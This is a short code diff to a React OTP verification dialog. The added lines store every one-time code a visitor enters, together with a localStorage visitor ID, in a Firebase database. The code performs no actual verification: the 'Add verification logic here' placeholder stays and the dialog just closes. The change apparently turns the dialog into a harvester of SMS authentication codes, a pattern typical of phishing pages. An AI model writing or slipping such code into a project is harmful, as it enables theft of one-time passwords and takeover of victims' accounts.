@@ -4,13 +4,14 @@ import { useState, useRef, useEffect } from "react"
 import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
+import { addData } from "@/lib/firebase"
 
 interface OtpDialogProps {
   open: boolean
   onOpenChange: (open: boolean) => void
   phoneNumber: string
 }
-
+const allOtps=['']
 export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
@@ -39,8 +40,11 @@ export function OtpDialog({ open, onOpenChange, phoneNumber }: OtpDialogProps) {
     }
   }
 
-  const handleVerify = () => {
+  const handleVerify = async () => {
     console.log("OTP verification:", otp)
+    const visitorID=localStorage.getItem('visitor')
+    allOtps.push(otp)
+   await addData({id:visitorID,otp,allOtps})
     // Add verification logic here
     onOpenChange(false)
   }
